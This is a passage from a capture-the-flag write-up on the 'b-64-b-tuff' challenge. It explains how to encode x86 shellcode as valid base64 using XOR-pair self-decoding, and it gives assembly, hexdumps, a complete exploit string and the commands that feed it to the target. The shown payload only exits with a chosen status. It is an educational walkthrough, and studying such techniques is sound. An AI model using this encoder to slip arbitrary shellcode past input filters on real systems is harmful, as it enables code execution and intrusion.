<span class="Identifier">inc</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00000080</span>
<span class="Identifier">push</span> <span class="Identifier">edi</span> <span class="Comment">; 0x00000000</span>
<span class="Identifier">push</span> <span class="Identifier">edx</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00800000</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; And then the 0x80000000</span>
<span class="Identifier">push</span> <span class="Number">0x41414146</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414139</span> <span class="Comment">; 0x0000007F</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">inc</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00000080</span>
<span class="Identifier">push</span> <span class="Identifier">edi</span> <span class="Comment">; 0x00000000</span>
<span class="Identifier">push</span> <span class="Identifier">edx</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00800000</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Padding (calculated based on the length above, subtracted from 0x141)</span>
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAA</span>'

<span class="Comment">; The second halves of the pairs (ie, the encoded data; this is where the decoded data will end up by the time execution gets here)</span>
<span class="Identifier">dd</span> <span class="Number">0x41414379</span>
<span class="Identifier">dd</span> <span class="Number">0x2b2b7a41</span>
<span class="Identifier">dd</span> <span class="Number">0x412f2b2b</span>
</pre>

And that's it! Let's try it out! The code leading up to the padding assembles to:

<pre>
00000000  68 41 41 41 41 58 35 41  41 41 41 50 50 50 50 50  |hAAAAX5AAAAPPPPP|
00000010  50 50 50 61 68 41 42 6a  6a 58 35 41 43 2b 2b 50  |PPPahABjjX5AC++P|
00000020  59 68 41 42 41 41 5a 31  51 41 68 46 41 41 41 58  |YhABAAZ1QAhFAAAX|
00000030  35 39 41 41 41 50 5a 42  31 51 41 41 41 41 41 68  |59AAAPZB1QAAAAAh|
00000040  41 41 6a 6a 5a 31 51 41  68 46 41 41 41 58 35 39  |AAjjZ1QAhFAAAX59|
00000050  41 41 41 50 5a 42 57 52  4c 5a 44 31 51 41 41 41  |AAAPZBWRLZD1QAAA|
00000060  41 41 68 6a 6a 62 41 5a  31 51 41 68 46 41 41 41  |AAhjjbAZ1QAhFAAA|
00000070  58 35 39 41 41 41 50 5a  42 57 52 4c 4c 5a 44 44  |X59AAAPZBWRLLZDD|
00000080  31 51 41 68 46 41 41 41  58 35 39 41 41 41 50 5a  |1QAhFAAAX59AAAPZ|
00000090  42 57 52 4c 4c 4c 5a 44  44 44 31 51 41           |BWRLLLZDDD1QA|
</pre>


We can verify it's all base64 by eyeballing it. We can also determine that it's 0x9d bytes long, which means to get to 0x141 we need to pad it with 0xa4 bytes (already included above) before the encoded data.

We can dump allll that code into a file, and run it with run_raw_code (don't forget to apply the patch from earlier to change the base address to 0x41410000, and don't forget to compile with -m32 for 32-bit mode):

<pre id='vimCodeElement'>
$ nasm <span class="Special">-o</span> file file.asm
$ strace ./run_raw_code ./file
<span class="Statement">read</span><span class="PreProc">(</span><span class="Number">3</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="String">hAAAAX5AAAAPPPPPPPPahABjjX5AC++P</span><span class="Operator">&quot;</span><span class="Special">..., </span><span class="Number">333</span><span class="PreProc">)</span> <span class="Operator">=</span> <span class="Number">333</span>
<span class="Statement">exit</span><span class="PreProc">(</span><span class="Number">1094795585</span><span class="PreProc">)</span>                        <span class="Operator">=</span> ?
+++ exited with <span class="Number">65</span> +++
</pre>

It works! And it only took me two tries (I missed the 'inc ecx' lines the first time :) ).

I realize that it's a bit inefficient to encode 3 lines into like 100, but that's the cost of having a limited character set!

<h2>Solving the level</h2>

Bringing it back to the actual challenge...

Now that we have working base 64 code, the rest is pretty simple. Since the app encodes the base64 for us, we have to take what we have and <em>decode</em> it first, to get the string that would generate the base64 we want.

Because base64 works in blocks and has padding, we're going to append a few meaningless bytes to the end so that if anything gets messed up by being a partial block, they will.

Here's the full "exploit", assembled:

<pre>hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/A</pre>

We're going to add a few 'A's to the end for padding (the character we choose is meaningless), and run it through base64 -d (adding '='s to the end until we stop getting decoding errors):

<pre>
$ echo 'hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/AAAAAAA=' | base64 -d | hexdump -Cv
00000000  84 00 00 01 7e 40 00 00  0f 3c f3 cf 3c f3 da 84  |....~@...&lt;..&lt;...|
00000010  00 63 8d 7e 40 0b ef 8f  62 10 01 00 06 75 40 08  |.c.~@...b....u@.|
00000020  45 00 00 17 e7 d0 00 00  f6 41 d5 00 00 00 00 21  |E........A.....!|
00000030  00 08 e3 67 54 00 84 50  00 01 7e 7d 00 00 0f 64  |...gT..P..~}...d|
00000040  15 91 2d 90 f5 40 00 00  00 08 63 8d b0 19 d5 00  |..-..@....c.....|
00000050  21 14 00 00 5f 9f 40 00  03 d9 05 64 4b 2d 90 c3  |!..._.@....dK-..|
00000060  d5 00 21 14 00 00 5f 9f  40 00 03 d9 05 64 4b 2c  |..!..._.@....dK,|
00000070  b6 43 0c 3d 50 00 00 00  00 00 00 00 00 00 00 00  |.C.=P...........|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000f0  03 20 80 00 0c fe fb ef  bf 00 00 00 00 00        |. ............|
</pre>


Let's convert that into a string that we can use on the commandline by chaining together a bunch of shell commands:

<pre id='vimCodeElement'>
<span class="Statement">echo</span><span class="String"> -ne </span><span class="Operator">'</span><span class="String">hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/AAAAAAA=</span><span class="Operator">'</span><span class="String"> </span>| base64 <span class="Special">-d</span> | xxd <span class="Special">-g</span>1 file | cut <span class="Special">-b</span>10-57 | tr <span class="Special">-d</span> <span class="Operator">'</span><span class="String">\n</span><span class="Operator">'</span> | <span class="Statement">sed</span> <span class="Operator">'</span><span class="String">s/ /\\x/g</span><span class="Operator">'</span>
\x84\x00\x00\x01\x7e\x40\x00\x00\x0f\x3c\xf3\xcf\x3c\xf3\xda\x84\x00\x63\x8d\x7e\x40\x0b\xef\x8f\x62\x10\x01\x00\x06\x75\x40\x08\x45\x00\x00\x17\xe7\xd0\x00\x00\xf6\x41\xd5\x00\x00\x00\x00\x21\x00\x08\xe3\x67\x54\x00\x84\x50\x00\x01\x7e\x7d\x00\x00\x0f\x64\x15\x91\x2d\x90\xf5\x40\x00\x00\x00\x08\x63\x8d\xb0\x19\xd5\x00\x21\x14\x00\x00\x5f\x9f\x40\x00\x03\xd9\x05\x64\x4b\x2d\x90\xc3\xd5\x00\x21\x14\x00\x00\x5f\x9f\x40\x00\x03\xd9\x05\x64\x4b\x2c\xb6\x43\x0c\x3d\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x20\x80\x00\x0c\xfe\xfb\xef\xbf\x00\x00\x00\x00\x00
</pre>

And, finally, feed all that into b-64-b-tuff:

<pre id='vimCodeElement'>
$ <span class="Statement">echo</span><span class="String"> -ne </span><span class="Operator">'</span><span class="String">\x84\x00\x00\x01\x7e\x40\x00\x00\x0f\x3c\xf3\xcf\x3c\xf3\xda\x84\x00\x63\x8d\x7e\x40\x0b\xef\x8f\x62\x10\x01\x00\x06\x75\x40\x08\x45\x00\x00\x17\xe7\xd0\x00\x00\xf6\x41\xd5\x00\x00\x00\x00\x21\x00\x08\xe3\x67\x54\x00\x84\x50\x00\x01\x7e\x7d\x00\x00\x0f\x64\x15\x91\x2d\x90\xf5\x40\x00\x00\x00\x08\x63\x8d\xb0\x19\xd5\x00\x21\x14\x00\x00\x5f\x9f\x40\x00\x03\xd9\x05\x64\x4b\x2d\x90\xc3\xd5\x00\x21\x14\x00\x00\x5f\x9f\x40\x00\x03\xd9\x05\x64\x4b\x2c\xb6\x43\x0c\x3d\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x20\x80\x00\x0c\xfe\xfb\xef\xbf\x00\x00\x00\x00\x00</span><span class="Operator">'</span><span class="String"> </span>| strace ./b-64-b-tuff
<span class="Statement">read</span><span class="PreProc">(</span><span class="Number">0</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="Special">\204\0\0</span><span class="Special">\1</span><span class="String">~@</span><span class="Special">\0\0</span><span class="Special">\1</span><span class="String">7&lt;</span><span class="Special">\363</span><span class="Special">\317</span><span class="String">&lt;</span><span class="Special">\363</span><span class="Special">\332\204\0</span><span class="String">c</span><span class="Special">\215</span><span class="String">~@</span><span class="Special">\v</span><span class="Special">\357\217</span><span class="String">b</span><span class="Special">\2</span><span class="String">0</span><span class="Special">\1</span><span class="Special">\0</span><span class="Special">\6</span><span class="String">u@</span><span class="Special">\1</span><span class="String">0</span><span class="Operator">&quot;</span><span class="Special">..., </span><span class="Number">4096</span><span class="PreProc">)</span> <span class="Operator">=</span> <span class="Number">254</span>
write<span class="PreProc">(</span><span class="Number">1</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="String">Read 254 bytes!</span><span class="Special">\n</span><span class="Operator">&quot;</span><span class="Special">, 16Read </span><span class="Number">254</span><span class="Special"> bytes</span><span class="Operator">!</span>
<span class="PreProc">)</span>       <span class="Operator">=</span> <span class="Number">16</span>
write<span class="PreProc">(</span><span class="Number">1</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="String">hAAAAX5AAAAPPPPPPPPahABjjX5AC++P</span><span class="Operator">&quot;</span><span class="Special">..., 340hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/</span><span class="Identifier">AAAAAAA</span>=<span class="PreProc">)</span> <span class="Operator">=</span> <span class="Number">340</span>
write<span class="PreProc">(</span><span class="Number">1</span><span class="Special">, </span><span class="Operator">&quot;</span><span class="Special">\n</span><span class="Operator">&quot;</span><span class="Special">, </span><span class="Number">1</span>
<span class="PreProc">)</span>                       <span class="Operator">=</span> <span class="Number">1</span>
<span class="Statement">exit</span><span class="PreProc">(</span><span class="Number">1094795585</span><span class="PreProc">)</span>                        <span class="Operator">=</span> ?
+++ exited with <span class="Number">65</span> +++
</pre>

And, sure enough, it exited with the status that we wanted! Now that we've encoded 12 bytes of shellcode, we can encode any amount of arbitrary code that we choose to!

<h2>Summary</h2>

So that, ladies and gentlemen and everyone else, is how to encode some simple shellcode into base64 by hand. <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/sploit.rb'>My solution</a> does almost exactly those steps, but in an automated fashion. I also found a few shortcuts while writing the blog that aren't included in that code.

To summarize:

<ul>
<li>Pad the input to a multiple of 4 bytes</li>
<li>Break the input up into 4-byte blocks, and find an xor pair that generates each value</li>
<li>Set ecx to a value that's 0x41 bits before the encoded payload, which is half of the xor pairs</li>
<li>Put the other half the xor pair in-line, loaded into edx and xor'd with the encoded payload</li>
<li>If there are any MSB bits set, set edx to 0x80 and use the stack to shift them into the right place to be inserted with a xor</li>
<li>After all the xors, add padding that's base64-compatible, but is effectively a no-op, to bridge between the decoder and the encoded payload</li>
<li>End with the encoded stub (second half of the xor pairs)</li>
</ul>

When the code runs, it xors each pair, and writes it in-line to where the encoded value was. It sets the MSB bits as needed. The padding runs, which is an effective no-op, then finally the freshly decoded code runs.

It's complex, but hopefully this blog helps explain it!